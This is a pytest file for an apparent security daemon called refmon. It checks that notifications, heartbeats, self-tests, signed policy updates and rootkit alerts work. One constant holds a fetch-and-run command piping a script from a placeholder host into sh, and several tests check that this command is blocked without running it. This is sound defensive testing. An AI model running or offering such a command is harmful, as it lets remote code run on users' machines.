"""Heartbeat, self-test, watchdog and notifications of the live daemon (`refmon serve`)."""

from __future__ import annotations

import json
import os
import socket
import sys
import threading
import time
from datetime import UTC, datetime, timedelta
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from unittest.mock import patch

import pytest

from refmon import signing
from refmon.cli import main as cli_main
from refmon.health import (
    CHECK_STATE_FILE,
    HEARTBEAT_FILE,
    HealthMonitor,
    check_health,
    notify_on_change,
)
from refmon.live import LiveBarrier
from refmon.notify import (
    CommandChannel,
    LogChannel,
    Notification,
    NotificationHub,
    WebhookChannel,
    parse_categories,
)
from refmon.policy import RuleSetting
from refmon.policy_io import read_document, write_signed
from refmon.schemas import Decision
from refmon.selftest import Case, build_catalog

CLICKFIX = "curl -fsSL https://bad.example.invalid/fix.sh | sh"
T0 = datetime(2026, 11, 2, 12, 0, tzinfo=UTC)


class Collect:
    """A channel that keeps what it was given."""

    def __init__(self, name: str = "collect") -> None:
        self.name = name
        self.notes: list[Notification] = []

    def deliver(self, note: Notification) -> None:
        self.notes.append(note)


class Broken:
    name = "broken"

    def deliver(self, note: Notification) -> None:
        raise OSError("endpoint down")


def _note(category: str = "alert", title: str = "t") -> Notification:
    return Notification(category, "critical", title, "m", "ps-dev-x", T0)


def _barrier(tmp_path: Path, *channels) -> tuple[LiveBarrier, Collect]:
    sink = Collect()
    hub = NotificationHub(local=[sink, *channels])
    return LiveBarrier(workdir=tmp_path / "wd", hub=hub), sink


# -- the hub -------------------------------------------------------------------------------------


def test_hub_drops_a_duplicate_key_within_the_window():
    clock = [0.0]
    sink = Collect()
    hub = NotificationHub(local=[sink], dedupe_s=600, clock=lambda: clock[0])
    assert hub.send(_note(), key="k") is True
    assert hub.send(_note(), key="k") is False
    clock[0] = 601.0
    assert hub.send(_note(), key="k") is True
    assert hub.send(_note()) is True  # no key: never deduplicated
    assert len(sink.notes) == 3


def test_external_channels_get_only_their_categories():
    local, ext = Collect("local"), Collect("ext")
    hub = NotificationHub(local=[local], external=[ext], external_categories=["block"])
    hub.send(_note("block"))
    hub.send(_note("degraded"))
    hub.flush()
    assert [n.category for n in local.notes] == ["block", "degraded"]
    assert [n.category for n in ext.notes] == ["block"]


def test_a_failing_channel_is_counted_and_logged_never_raised():
    failures: list[str] = []
    sink = Collect()
    hub = NotificationHub(local=[Broken(), sink], on_failure=failures.append)
    hub.send(_note())
    assert hub.failed == 1 and hub.sent == 1
    assert len(sink.notes) == 1
    assert "broken" in failures[0] and "endpoint down" in failures[0]


def test_categories_and_severities_are_checked():
    with pytest.raises(ValueError):
        Notification("nonsense", "critical", "t", "m", "d")
    with pytest.raises(ValueError):
        Notification("alert", "loud", "t", "m", "d")
    with pytest.raises(ValueError):
        NotificationHub(external_categories=["block", "nonsense"])
    assert parse_categories(None) == ("block", "hold", "alert", "rootkit", "lifecycle")
    assert "degraded" in parse_categories("all")
    assert parse_categories("block, hold") == ("block", "hold")
    with pytest.raises(ValueError):
        WebhookChannel("file:///etc/passwd")


def test_command_channel_gets_json_on_stdin_and_the_headline_in_env(tmp_path: Path):
    out = tmp_path / "got.json"
    script = (
        "import json,os,sys; d=json.load(sys.stdin); "
        f"d['env']=os.environ['REFMON_TITLE']; open({str(out)!r},'w').write(json.dumps(d))"
    )
    CommandChannel([sys.executable, "-c", script]).deliver(_note(title="Blocked"))
    got = json.loads(out.read_text())
    assert got["title"] == "Blocked" and got["env"] == "Blocked"
    assert got["source"] == "refmon"
    with pytest.raises(OSError):
        CommandChannel([sys.executable, "-c", "raise SystemExit(3)"]).deliver(_note())


def test_webhook_channel_posts_text_and_the_structured_notification():
    got: list[dict] = []

    class Handler(BaseHTTPRequestHandler):
        def do_POST(self):
            got.append(json.loads(self.rfile.read(int(self.headers["Content-Length"]))))
            self.send_response(204)
            self.end_headers()

        def log_message(self, *a):
            return

    server = HTTPServer(("127.0.0.1", 0), Handler)
    t = threading.Thread(target=server.handle_request, daemon=True)
    t.start()
    try:
        WebhookChannel(f"http://localhost:{server.server_address[1]}/h").deliver(_note("block"))
    finally:
        t.join(5)
        server.server_close()
    assert got[0]["text"].startswith("[Refmon CRITICAL]")
    assert got[0]["refmon"]["category"] == "block"


def test_log_channel_appends_json_lines(tmp_path: Path):
    path = tmp_path / "n.jsonl"
    LogChannel(path).deliver(_note())
    LogChannel(path).deliver(_note())
    lines = path.read_text().splitlines()
    assert len(lines) == 2 and json.loads(lines[0])["category"] == "alert"


# -- verdict notifications -----------------------------------------------------------------------


def test_a_block_notifies_once_per_story_without_raw_content(tmp_path: Path):
    barrier, sink = _barrier(tmp_path)
    out = barrier.guard_command(CLICKFIX, origin="web", execute=False)
    assert out.decision == "block"
    verdicts = [n for n in sink.notes if n.category in ("block", "hold")]
    # the story passes through hold on its way to block: only the final decision is sent
    assert [n.title for n in verdicts] == ["Blocked"]
    note = verdicts[0]
    assert note.details["story_id"] == out.story_id
    assert note.device.startswith("ps-dev-")
    text = json.dumps(note.to_dict())
    for raw in ("bad.example.invalid", "fix.sh", "curl", socket.gethostname()):
        assert raw not in text
    # and it is on disk
    logged = (barrier.logs_dir / "notifications.jsonl").read_text()
    assert "Blocked" in logged and "bad.example.invalid" not in logged


def test_an_allow_sends_nothing_and_demo_stories_are_never_incidents(tmp_path: Path):
    barrier, sink = _barrier(tmp_path)
    barrier.guard_command("echo hello", origin="none", execute=False)
    barrier.run_all_presets()
    barrier.replay_golden("S13")
    assert [n for n in sink.notes if n.category in ("block", "hold")] == []


def test_observe_mode_says_would_block(tmp_path: Path):
    barrier, sink = _barrier(tmp_path)
    barrier.set_mode("observe")
    barrier.guard_command(CLICKFIX, origin="web", execute=False)
    titles = [n.title for n in sink.notes]
    assert "Would block (not enforced)" in titles
    mode_change = next(n for n in sink.notes if n.title == "Mode changed")
    assert mode_change.severity == "warning" and "block -> observe" in mode_change.message


# -- the health monitor --------------------------------------------------------------------------


def test_first_tick_runs_the_self_test_and_writes_a_pseudonymous_heartbeat(tmp_path: Path):
    barrier, sink = _barrier(tmp_path)
    mon = HealthMonitor(barrier, rootkit_interval_s=0)
    mon.tick(T0)
    report = mon.scheduler.last
    assert report is not None and report.passed and not report.failed
    doc = json.loads((barrier.workdir / HEARTBEAT_FILE).read_text())
    assert doc["heartbeat"]["device"] == barrier.device_pseudonym
    assert socket.gethostname() not in json.dumps(doc)
    assert doc["heartbeat"]["self_test"]["passed"] == len(report.passed)
    assert doc["pid"] == os.getpid()
    # degraded capabilities: reported once, as one warning, never as an external alert
    degraded = [n for n in sink.notes if n.category == "degraded"]
    assert len(degraded) == 1 and "network_connections" in degraded[0].message
    mon.tick(T0 + timedelta(seconds=1))
    assert len([n for n in sink.notes if n.category == "degraded"]) == 1


def test_heartbeat_follows_the_policy_interval(tmp_path: Path):
    barrier, _ = _barrier(tmp_path)
    mon = HealthMonitor(barrier, rootkit_interval_s=0)
    mon.tick(T0)
    mon.tick(T0 + timedelta(seconds=30))
    assert mon.state.beats == 1
    mon.tick(T0 + timedelta(seconds=barrier.policy.heartbeat.interval))
    assert mon.state.beats == 2


def test_a_failing_protection_alerts_once_and_recovers(tmp_path: Path):
    barrier, sink = _barrier(tmp_path)
    mon = HealthMonitor(barrier, rootkit_interval_s=0)
    real = next(c for c in build_catalog() if c.protection == "R-EFF-FETCH")
    mon.scheduler.catalog = [Case(real.protection, "broken", real.build, lambda o: False)]
    mon.tick(T0)
    alerts = [n for n in sink.notes if n.title == "Protection not working"]
    assert len(alerts) == 1 and "R-EFF-FETCH" in alerts[0].message
    assert alerts[0].severity == "critical" and alerts[0].category == "alert"
    hb = json.loads((barrier.workdir / HEARTBEAT_FILE).read_text())
    assert hb["heartbeat"]["self_test"]["failed"] == ["R-EFF-FETCH"]
    assert check_health(barrier.workdir, T0)[0] == 2
    # the next self-test is due after the policy's interval: still failing, no second alert
    mon.tick(T0 + timedelta(seconds=barrier.policy.self_test.interval))
    assert len([n for n in sink.notes if n.title == "Protection not working"]) == 1
    mon.scheduler.catalog = [real]
    mon.scheduler.last = None  # run now
    mon.tick(T0 + timedelta(hours=13))
    assert any(n.title == "Recovered" and "R-EFF-FETCH" in n.message for n in sink.notes)


def test_a_switched_off_protection_makes_its_real_self_test_fail(tmp_path: Path):
    """The live pipeline runs with fetch switched off while the signed policy still wants it."""
    barrier, sink = _barrier(tmp_path)
    mon = HealthMonitor(barrier, rootkit_interval_s=0)
    off = RuleSetting(id="R-EFF-FETCH", enabled=False)
    live = barrier.pipeline.policy
    barrier.pipeline.set_policy(live.model_copy(update={"rules": [*live.rules, off]}))
    mon.tick(T0)
    assert "R-EFF-FETCH" in mon.scheduler.last.failed
    assert any(n.title == "Protection not working" for n in sink.notes)


def test_an_unsigned_policy_change_alerts_and_the_last_valid_policy_stays(tmp_path: Path):
    barrier, sink = _barrier(tmp_path)
    mon = HealthMonitor(barrier, rootkit_interval_s=0)
    mon.tick(T0)
    good = barrier.policy_path.read_text()
    barrier.policy_path.write_text(good.replace("mode: block", "mode: observe"))
    mon.tick(T0 + timedelta(seconds=1))
    assert barrier.policy.mode.value == "block"
    rejected = [n for n in sink.notes if n.title == "Policy rejected"]
    assert len(rejected) == 1 and rejected[0].severity == "critical"
    assert check_health(barrier.workdir, T0 + timedelta(seconds=2))[0] == 2  # written at once
    barrier.policy_path.write_text(good)
    mon.tick(T0 + timedelta(seconds=2))
    assert any(n.title == "Recovered" and "policy" in n.message for n in sink.notes)


def test_a_validly_signed_policy_change_is_adopted(tmp_path: Path):
    barrier, sink = _barrier(tmp_path)
    mon = HealthMonitor(barrier, rootkit_interval_s=0)
    mon.tick(T0)
    doc = read_document(barrier.policy_path)
    unsigned = {k: v for k, v in doc.items() if k != signing.SIGNATURE_FIELD}
    unsigned["mode"] = "warn"
    time.sleep(0.01)  # a new mtime
    write_signed(unsigned, barrier._private_key(), barrier.policy_path)
    mon.tick(T0 + timedelta(seconds=1))
    assert barrier.policy.mode.value == "warn"
    assert barrier.pipeline.policy.mode.value == "warn"
    assert not any(n.title == "Policy rejected" for n in sink.notes)


def test_a_dead_sandbox_watcher_is_an_alert(tmp_path: Path):
    barrier, sink = _barrier(tmp_path)
    clock = [1000.0]
    mon = HealthMonitor(barrier, rootkit_interval_s=0, watcher_stale_s=30, clock=lambda: clock[0])
    assert mon.watcher_stopped() is False  # never started

    class Dead:
        def is_alive(self):
            return False

    barrier._watcher_thread = Dead()
    mon.tick(T0)
    alerts = [n for n in sink.notes if n.title == "Sandbox watcher stopped"]
    assert len(alerts) == 1 and alerts[0].category == "alert"


def test_a_stuck_sandbox_watcher_is_an_alert(tmp_path: Path):
    barrier, _ = _barrier(tmp_path)
    clock = [1000.0]
    mon = HealthMonitor(barrier, rootkit_interval_s=0, watcher_stale_s=30, clock=lambda: clock[0])

    class Alive:
        def is_alive(self):
            return True

    barrier._watcher_thread = Alive()
    barrier.watcher_beat = 1000.0
    assert mon.watcher_stopped() is False
    clock[0] = 1031.0
    assert mon.watcher_stopped() is True


def test_a_rootkit_finding_notifies_on_change_only(tmp_path: Path):
    barrier, sink = _barrier(tmp_path)
    mon = HealthMonitor(barrier, rootkit_interval_s=0)
    from dataclasses import replace

    from refmon.rootkit import RootkitFinding

    finding = RootkitFinding(
        "linker_preload", "etc_ld_so_preload", "contract", "high", "hmac:x", 5.5
    )
    barrier.last_rootkit = replace(
        barrier.last_rootkit, calculus_decision=Decision.BLOCK, findings=(finding,), log_odds=-1.4
    )
    mon.tick(T0)
    mon.tick(T0 + timedelta(seconds=1))
    hits = [n for n in sink.notes if n.category == "rootkit"]
    assert len(hits) == 1 and hits[0].title == "Rootkit scan: BLOCK"
    assert "etc_ld_so_preload" in hits[0].message


def test_periodic_rootkit_scan_runs_on_its_interval(tmp_path: Path):
    barrier, _ = _barrier(tmp_path)
    clock = [0.0]
    mon = HealthMonitor(barrier, rootkit_interval_s=100, clock=lambda: clock[0])
    with patch.object(barrier, "trigger_rootkit_scan") as scan:
        mon.tick(T0)  # the barrier scanned at start
        clock[0] = 50.0
        mon.tick(T0 + timedelta(seconds=50))
        clock[0] = 101.0
        mon.tick(T0 + timedelta(seconds=101))
    assert scan.call_count == 1


def test_the_health_thread_survives_a_failing_check(tmp_path: Path):
    barrier, _ = _barrier(tmp_path)
    mon = HealthMonitor(barrier, rootkit_interval_s=0)
    calls = []

    def boom(now=None):
        calls.append(1)
        raise RuntimeError("check broke")

    mon.tick = boom
    mon.start(poll_s=0.01)
    time.sleep(0.1)
    mon.stop()
    assert len(calls) > 1
    assert "HEALTH CHECK ERROR RuntimeError" in barrier.barrier_log_path.read_text()


# -- the outside view: `refmon health` -----------------------------------------------------------


def _beat(tmp_path: Path) -> tuple[LiveBarrier, HealthMonitor]:
    barrier, _ = _barrier(tmp_path)
    mon = HealthMonitor(barrier, rootkit_interval_s=0)
    mon.tick(T0)
    return barrier, mon


def test_check_health_states(tmp_path: Path):
    assert check_health(tmp_path / "nothing")[0] == 1
    barrier, _ = _beat(tmp_path)
    code, info = check_health(barrier.workdir, T0 + timedelta(seconds=10))
    assert (code, info["status"]) == (0, "healthy")  # degraded capabilities alone do not count
    stale = T0 + timedelta(seconds=barrier.policy.heartbeat.stale_after + 1)
    assert check_health(barrier.workdir, stale)[1]["status"] == "stale"
    doc = json.loads((barrier.workdir / HEARTBEAT_FILE).read_text())
    doc["pid"] = 2**22 + 12345  # beyond pid_max on most systems
    (barrier.workdir / HEARTBEAT_FILE).write_text(json.dumps(doc))
    code, info = check_health(barrier.workdir, T0)
    assert (code, info["status"]) == (1, "not_running")


def test_notify_on_change_alerts_once_per_outage_and_once_on_recovery(tmp_path: Path):
    sink = Collect()
    hub = NotificationHub(local=[sink])
    info_down = {"status": "stale", "reason": "no heartbeat for 999 s", "device": "ps-dev-a"}
    info_up = {"status": "healthy", "reason": "heartbeat fresh", "device": "ps-dev-a"}
    assert notify_on_change(tmp_path, 0, info_up, hub, T0) is False  # healthy from the start
    assert notify_on_change(tmp_path, 1, info_down, hub, T0) is True
    assert notify_on_change(tmp_path, 1, info_down, hub, T0) is False  # cron again: quiet
    assert notify_on_change(tmp_path, 0, info_up, hub, T0) is True
    assert [n.title for n in sink.notes] == ["Refmon daemon not running", "Recovered"]
    assert (tmp_path / CHECK_STATE_FILE).is_file()


def test_cli_health_exit_codes_and_command_notification(tmp_path: Path, capsys):
    assert cli_main(["health", "--workdir", str(tmp_path / "none")]) == 1
    assert "NOT_RUNNING" in capsys.readouterr().out
    barrier, _ = _beat(tmp_path)
    doc = json.loads((barrier.workdir / HEARTBEAT_FILE).read_text())
    doc["heartbeat"]["ts"] = datetime.now(UTC).isoformat()
    (barrier.workdir / HEARTBEAT_FILE).write_text(json.dumps(doc))
    assert cli_main(["health", "--workdir", str(barrier.workdir), "--json"]) == 0
    assert json.loads(capsys.readouterr().out)["status"] == "healthy"
    doc["heartbeat"]["ts"] = "2020-01-01T00:00:00+00:00"
    (barrier.workdir / HEARTBEAT_FILE).write_text(json.dumps(doc))
    out = tmp_path / "cmd.txt"
    cmd = f"{sys.executable} -c \"import os; open({str(out)!r},'a').write(os.environ['REFMON_TITLE'])\""
    args = ["health", "--workdir", str(barrier.workdir), "--notify-command", cmd]
    assert cli_main(args) == 1
    assert cli_main(args) == 1
    assert out.read_text() == "Refmon daemon not running"  # once
    assert cli_main(["health", "--notify-on", "nonsense"]) == 2


# -- serve end to end ----------------------------------------------------------------------------


def test_serve_starts_beats_notifies_and_reports_its_stop(tmp_path: Path):
    from refmon import live

    sink = Collect()
    hub = NotificationHub(external=[sink])
    holder: dict = {}
    real_make = live.make_http_server

    def make(barrier, host="127.0.0.1", port=8765):
        server = real_make(barrier, host=host, port=0)
        holder["server"], holder["barrier"] = server, barrier
        return server

    with patch.object(live, "make_http_server", make):
        t = threading.Thread(
            target=live.serve_forever,
            kwargs={"workdir": tmp_path / "wd", "hub": hub, "rootkit_interval_s": 0},
            daemon=True,
        )
        t.start()
        deadline = time.time() + 10
        while not (tmp_path / "wd" / HEARTBEAT_FILE).exists() and time.time() < deadline:
            time.sleep(0.05)
        assert check_health(tmp_path / "wd")[0] == 0
        holder["barrier"].guard_command(CLICKFIX, origin="web", execute=False)
        holder["server"].shutdown()
        t.join(10)
    titles = [n.title for n in sink.notes]
    assert titles[0] == "Refmon started"
    assert "Blocked" in titles
    assert titles[-1] == "Refmon stopped"
    assert "Degraded protection" not in titles  # not an external category by default
